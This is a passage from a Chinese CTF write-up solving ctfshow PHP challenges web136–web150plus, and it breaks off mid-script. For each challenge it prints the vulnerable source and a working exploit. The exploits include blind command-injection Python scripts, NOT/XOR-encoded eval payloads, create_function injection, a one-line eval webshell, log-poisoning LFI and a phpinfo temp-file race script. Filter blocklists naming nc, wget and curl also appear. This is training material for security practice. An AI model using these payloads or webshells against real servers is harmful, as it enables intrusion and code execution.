die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 6 } 7} 8if(isset($_GET[\u0026#39;c\u0026#39;])){ 9 $c=$_GET[\u0026#39;c\u0026#39;]; 10 check($c); 11 exec($c); 12} 13else{ 14 highlight_file(__FILE__); 15} 16?\u0026gt; 这题要用到一个linux的命令tee\nLinux tee命令介绍 tee命令在Linux中用于从标准输入读取数据，并将其写入到标准输出和一个或多个文件中。tee命令通常与其他命令一起通过管道使用。\n如\n1ls /|tee 1.txt 就可以将ls /的结果写入到1.txt文件中\nls /|tee 1 这题ban掉了.\n访问url/1，下载文件1\n看到flag的位置\n?c=cat /f149_15_h3r3|tee 2 web137 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:27:49 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24 25 26call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); 我们需要通过post传入一个数组，数组中包含类名和方法名\npayload\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag 又或者\nctfshow=ctfshow::getFlag web138 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:52:13 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24if(strripos($_POST[\u0026#39;ctfshow\u0026#39;], \u0026#34;:\u0026#34;)\u0026gt;-1){ 25 die(\u0026#34;private function\u0026#34;); 26} 27 28call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); 这道题限制了上一题的第二种解法\n第一种还能继续使用\npayload:\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag\rctfshow[0]=ctfshow\u0026amp;ctfshow[1]=getFlag web139 \u0026lt;?php\rerror_reporting(0);\rfunction check($x){\rif(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){\rdie(\u0026#39;too young too simple sometimes naive!\u0026#39;);\r}\r}\rif(isset($_GET[\u0026#39;c\u0026#39;])){\r$c=$_GET[\u0026#39;c\u0026#39;];\rcheck($c);\rexec($c);\r}\relse{\rhighlight_file(__FILE__);\r}\r?\u0026gt; 这题看着和前面那题是一样的\n但实际上没有写文件的权限\n这题可以通过时间盲注攻击获取文件名已经文件中的字符等\n时间盲注脚本：\n1import requests 2import time 3import string 4 5str = string.ascii_letters + string.digits + \u0026#34;-\u0026#34; + \u0026#34;{\u0026#34; + \u0026#34;}\u0026#34; + \u0026#34;_\u0026#34; + \u0026#34;~\u0026#34; # 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加 6result = \u0026#34;\u0026#34; # 初始化一个空字符串，用于保存结果 7 8#获取多少行 9for i in range(1, 99): 10 key = 0 #用于控制内层循环(j)的结束 11 12 #不break的情况下，一行最多几个字符 13 for j in range(1, 99): 14 if key == 1: 15 break 16 for n in str: #n就是一个一个的返回值 17 payload = \u0026#34;if [ `ls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then sleep 3;fi\u0026#34;.format(i, j, n) #{n}是占位符 18 #print(payload) 19 url = \u0026#34;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=\u0026#34; + payload 20 try: 21 requests.get(url, timeout=(2.5, 2.5)) #设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。 22 23 # 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环 24 except: 25 result = result + n 26 print(result) 27 break 28 if n == \u0026#39;~\u0026#39;: #str的最后一位，“~”不常出现，用作结尾 29 key = 1 30 31 # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置 32 result += \u0026#34; \u0026#34; 这个脚本的原理其实就是，通过shell编程中的if语句判断\nls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1} 中截取到的字符串是否与我们遍历的任一个字符匹配，若匹配成功则使用sleep命令使响应时间变为3s\n而脚本通过判断响应时间即可知道截取到的字符是否匹配，从而一个一个字符的获取\n读到flag的位置，接下来就是读文件了，原理一样\n1import requests 2import time 3import string 4 5str = string.digits+string.ascii_lowercase+\u0026#34;-\u0026#34;+\u0026#34;{\u0026#34;+\u0026#34;}\u0026#34; 6result = \u0026#34;\u0026#34; 7 8for i in range(1, 99): 9 key = 0 10 for j in range(1, 99): 11 if key == 1: 12 break 13 for n in str: 14 payload = \u0026#34;if [ `cat /f149_15_h3r3|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then sleep 3;fi\u0026#34;.format(i, j, n) 15 #print(payload) 16 url = \u0026#34;http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=\u0026#34; + payload 17 try: 18 requests.get(url, timeout=(2.5, 2.5)) 19 20\texcept: 21 result = result + n 22 print(result) 23 break 24 25 result += \u0026#34; \u0026#34; web140 函数的利用\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 12:39:25 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_POST[\u0026#39;f1\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;f2\u0026#39;])){ 15 $f1 = (String)$_POST[\u0026#39;f1\u0026#39;]; 16 $f2 = (String)$_POST[\u0026#39;f2\u0026#39;]; 17 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f1)){ 18 if(preg_match(\u0026#39;/^[a-z0-9]+$/\u0026#39;, $f2)){ 19 $code = eval(\u0026#34;return $f1($f2());\u0026#34;); 20 if(intval($code) == \u0026#39;ctfshow\u0026#39;){ 21 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 22 } 23 } 24 } 25} 原文\n需要$f1($f2());的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。\npayload1： system(system())\u0026mdash;\u0026gt; f1=system\u0026amp;f2=system\nstring system( string $command[, int \u0026amp;$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(\u0026lsquo;FLASE\u0026rsquo;)，空指令，失败返回FLASE。\npayload2： usleep(usleep())\u0026mdash;\u0026gt; f1=usleep\u0026amp;f2=usleep usleep没有返回值。 所以intval参数为空，失败返回0\npayload3： getdate(getdate())\u0026mdash;\u0026gt; f1=getdate\u0026amp;f2=getdate\narray getdate([ int $timestamp = time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())\u0026mdash;-\u0026gt;getdate(array型)\u0026mdash;\u0026gt;失败返回flase，intval为0。\nweb141 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:28:09 9 10*/ 11 12#error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 19 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 20 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3)){ 21 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 22 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 23 } 24 } 25} preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3) 此正则表达式用于检查字符串 $v3 是否完全由非单词字符组成，且不能为空。（单词字符：字母、数字和下划线）\n根据题目我们可以联想到取反，或，异或命令执行，这里随便一个都行\nphp中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1\u0026amp;v2=1\u0026amp;v3=-phpinfo()-\n羽师傅有个取反脚本\n1\u0026lt;?php 2//在命令行中运行 3 4/*author yu22x*/ 5 6fwrite(STDOUT,\u0026#39;[+]your function: \u0026#39;); 7 8$system=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 9 10fwrite(STDOUT,\u0026#39;[+]your command: \u0026#39;); 11 12$command=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 13 14echo \u0026#39;[*] (~\u0026#39;.urlencode(~$system).\u0026#39;)(~\u0026#39;.urlencode(~$command).\u0026#39;);\u0026#39;; 直接用就行\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)- web142 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:36:02 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 if(is_numeric($v1)){ 17 $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); 18 sleep($d); 19 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 20 } 21} 这题就是一个$d秒后出flag，直接传入v1=0，直接拿到flag\npayload:\n?v1=0 web143 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 12:48:14 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 18 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;, $v3)){ 19 die(\u0026#39;get out hacker!\u0026#39;); 20 } 21 else{ 22 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 23 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 24 } 25 } 26} 这题ban掉了取反，只能用其他位运算符构造payload\n羽师傅的异或脚本\n1\u0026lt;?php 2 3/*author yu22x*/ 4 5$myfile = fopen(\u0026#34;xor_rce.txt\u0026#34;, \u0026#34;w\u0026#34;); 6$contents=\u0026#34;\u0026#34;; 7for ($i=0; $i \u0026lt; 256; $i++) { 8\tfor ($j=0; $j \u0026lt;256 ; $j++) { 9 10\tif($i\u0026lt;16){ 11\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 12\t} 13\telse{ 14\t$hex_i=dechex($i); 15\t} 16\tif($j\u0026lt;16){ 17\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 18\t} 19\telse{ 20\t$hex_j=dechex($j); 21\t} 22\t$preg = \u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;; //根据题目给的正则表达式修改即可 23\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 24\techo \u0026#34;\u0026#34;; 25 } 26 27\telse{ 28\t$a=\u0026#39;%\u0026#39;.$hex_i; 29\t$b=\u0026#39;%\u0026#39;.$hex_j; 30\t$c=(urldecode($a)^urldecode($b)); 31\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 32\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 33\t} 34\t} 35 36} 37} 38fwrite($myfile,$contents); 39fclose($myfile); 1# -*- coding: utf-8 -*- 2 3# author yu22x 4 5import requests 6import urllib 7from sys import * 8import os 9def action(arg): 10 s1=\u0026#34;\u0026#34; 11 s2=\u0026#34;\u0026#34; 12 for i in arg: 13 f=open(\u0026#34;xor_rce.txt\u0026#34;,\u0026#34;r\u0026#34;) 14 while True: 15 t=f.readline() 16 if t==\u0026#34;\u0026#34;: 17 break 18 if t[0]==i: 19 #print(i) 20 s1+=t[2:5] 21 s2+=t[6:9] 22 break 23 f.close() 24 output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;^\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 25 return(output) 26 27while True: 28 param=action(input(\u0026#34;\\n[+] your function：\u0026#34;) )+action(input(\u0026#34;[+] your command：\u0026#34;))+\u0026#34;;\u0026#34; 29 print(param) web144 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 16:21:15 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 18 if(is_numeric($v1) \u0026amp;\u0026amp; check($v3)){ 19 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v2)){ 20 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 21 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 22 } 23 } 24} 25 26function check($str){ 27 return strlen($str)===1?true:false; 28} 这题跟143差不多，只是参数交换了一下位置\n直接异或出了\n?v1=1\u0026amp;v2=-(\u0026#34;%0c%06%0c%0b%05%0d\u0026#34;^\u0026#34;%7f%7f%7f%7f%60%60\u0026#34;)(\u0026#34;%03%01%0b%00%06%00\u0026#34;^\u0026#34;%60%60%7f%20%60%2a\u0026#34;)\u0026amp;v3=1 web145 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} 这题ban掉了异或运算符^,同时也ban掉了加减乘除\n但是我们还可以考虑构造三目运算符配合取反\npayload:\n/?v1=1\u0026amp;v2=1\u0026amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5): web146 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} 这题把三目运算符也ban了\n可以考虑使用位运算符|\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)| web147 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 02:04:38 9 10*/ 11 12 13 14highlight_file(__FILE__); 15 16if(isset($_POST[\u0026#39;ctf\u0026#39;])){ 17 $ctfshow = $_POST[\u0026#39;ctf\u0026#39;]; 18 if(!preg_match(\u0026#39;/^[a-z0-9_]*$/isD\u0026#39;,$ctfshow)) { 19 $ctfshow(\u0026#39;\u0026#39;,$_GET[\u0026#39;show\u0026#39;]); 20 } 21 22} create_function()代码注入\n如果我们第二个参数传入 echo 1;}phpinfo();// 就等价于\nfunction f($a) {\recho 1;}phpinfo();//\r}\r从而执行phpinfo()命令 那要怎么绕过正则表达式呢\n/^[a-z0-9_]*$/isD 这个正则表达式匹配所有的字母数字和下划线\n而且由于\nphp里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法\n所以我们可以通过\\create_function()来绕过这个正则表达式\npayload:\nGET show=;};system(\u0026#39;cat f*\u0026#39;);/*\rPOST ctf=\\create_function web148 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 03:52:11 9 10*/ 11 12 13 14include \u0026#39;flag.php\u0026#39;; 15if(isset($_GET[\u0026#39;code\u0026#39;])){ 16 $code=$_GET[\u0026#39;code\u0026#39;]; 17 if(preg_match(\u0026#34;/[A-Za-z0-9_\\%\\\\|\\~\\\u0026#39;\\,\\.\\:\\@\\\u0026amp;\\*\\+\\- ]+/\u0026#34;,$code)){ 18 die(\u0026#34;error\u0026#34;); 19 } 20 @eval($code); 21} 22else{ 23 highlight_file(__FILE__); 24} 25 26function get_ctfshow_fl0g(){ 27 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 28} 没ban异或运算符\npayload:\n(\u0026#34;%08%02%08%09%05%0d\u0026#34;^\u0026#34;%7b%7b%7b%7d%60%60\u0026#34;)(\u0026#34;%03%01%09%01%06%02\u0026#34;^\u0026#34;%60%60%7d%21%60%28\u0026#34;);\r//system(\u0026#34;cat f*\u0026#34;); web149 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 04:34:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15 16$files = scandir(\u0026#39;./\u0026#39;); 17foreach($files as $file) { 18 if(is_file($file)){ 19 if ($file !== \u0026#34;index.php\u0026#34;) { 20 unlink($file); 21 } 22 } 23} 24 25file_put_contents($_GET[\u0026#39;ctf\u0026#39;], $_POST[\u0026#39;show\u0026#39;]); 26 27$files = scandir(\u0026#39;./\u0026#39;); 28foreach($files as $file) { 29 if(is_file($file)){ 30 if ($file !== \u0026#34;index.php\u0026#34;) { 31 unlink($file); 32 } 33 } 34} 直接用一句话木马覆写掉index.php\nGET ?ctf=index.php\rPOST show=\u0026lt;?php @eval($_POST[\u0026#39;1\u0026#39;]);?\u0026gt; 写入后\nPOST 1=system(\u0026#39;cat /ctfshow_fl0g_here.txt\u0026#39;); web150 非预期 日志注入\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE){ 53 include($ctf); 54} 这题存在非预期，可以通过extract变量覆盖使isVIP=true，接着进行日志注入\n或者\n把马写到日志里\npayload:\nGET ?isVIP=true\u0026amp;1=system(\u0026#39;cat f*\u0026#39;);\rPOST ctf=/var/log/nginx/access.log web150plus 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE \u0026amp;\u0026amp; strrpos($ctf,\u0026#34;log\u0026#34;)===FALSE){ 53 include($ctf); 54} 这题ban掉了非预期解 日志注入的方法\n首先我们需要知道__autoload方法的作用\n__autoload()：自动加载函数，当使用未定义的类时会自动调用该函数。如果$class变量已设置，则将其作为函数调用。 而且这题的__autoload并不在类CTFSHOW中（障眼法）\n这个类在isVIP后面已经结束了\n所以我们可以通过\nif(class_exists($__CTFSHOW__)){\recho \u0026#34;class is exists!\u0026#34;;\r} 调用任意的类\n我们可以根据php会将.解析成_的特性绕过正则\nGET ?..CTFSHOW..=phpinfo 由于原题需要竞争所以后面就直接把flag放环境变量了\n这里我们直接在phpinfo里面找就行\n原题解法 拿到phpinfo我们就可以getshell了\nPHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。假如在服务器上找不到我们可以包含的文件，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n过程 1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据\n2.phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大\n3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接\n4.操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包\n5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除\n6.利用这个时间差，发第二个数据包，即可成功包含临时文件，最终getshell\n处理 PHP 对 enctype=\u0026ldquo;multipart/form-data\u0026quot;请求的处理过程如下： 1、请求到达； 2、创建临时文件（通常是/tmp/php[6 个随机字符]），并写入上传文件的内容； 3、调用相应 PHP 脚本进行处理，如校验名称、大小等； 4、删除临时文件。 总结 php post 上传文件产生临时文件，phpinfo读临时文件的路径和名字，本地包含后生成后门 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n大佬的脚本，但是是python2的\n1#!/usr/bin/python 2import sys 3import threading 4import socket 5 6def setup(host, port): 7 TAG=\u0026#34;Security Test\u0026#34; 8 PAYLOAD=\u0026#34;\u0026#34;\u0026#34;%s\\r 9\u0026lt;?php file_put_contents(\u0026#39;/tmp/g\u0026#39;, \u0026#39;\u0026lt;?=eval($_REQUEST[1])?\u0026gt;\u0026#39;)?\u0026gt;\\r\u0026#34;\u0026#34;\u0026#34; % TAG 10 REQ1_DATA=\u0026#34;\u0026#34;\u0026#34;-----------------------------7dbff1ded0714\\r 11Content-Disposition: form-data; name=\u0026#34;dummyname\u0026#34;; filename=\u0026#34;test.txt\u0026#34;\\r 12Content-Type: text/plain\\r 13\\r 14%s 15-----------------------------7dbff1ded0714--\\r\u0026#34;\u0026#34;\u0026#34; % PAYLOAD 16 padding=\u0026#34;A\u0026#34; * 5000 17 REQ1=\u0026#34;\u0026#34;\u0026#34;POST /06/phpinfo.php?a=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34; HTTP/1.1\\r 18Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 19HTTP_ACCEPT: \u0026#34;\u0026#34;\u0026#34; + padding + \u0026#34;\u0026#34;\u0026#34;\\r 20HTTP_USER_AGENT: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 21HTTP_ACCEPT_LANGUAGE: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 22HTTP_PRAGMA: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 23Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r 24Content-Length: %s\\r 25Host: %s\\r 26\\r 27%s\u0026#34;\u0026#34;\u0026#34; %(len(REQ1_DATA),host,REQ1_DATA) 28 #modify this to suit the LFI script 29 LFIREQ=\u0026#34;\u0026#34;\u0026#34;GET /06/lfi.php?file=%s HTTP/1.1\\r 30User-Agent: Mozilla/4.0\\r 31Proxy-Connection: Keep-Alive\\r 32Host: %s\\r 33\\r 34\\r 35\u0026#34;\u0026#34;\u0026#34; 36 return (REQ1, TAG, LFIREQ) 37 38def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): 39 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 40 s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 41 42 s.connect((host, port)) 43 s2.connect((host, port)) 44 45 s.send(phpinforeq) 46 d = 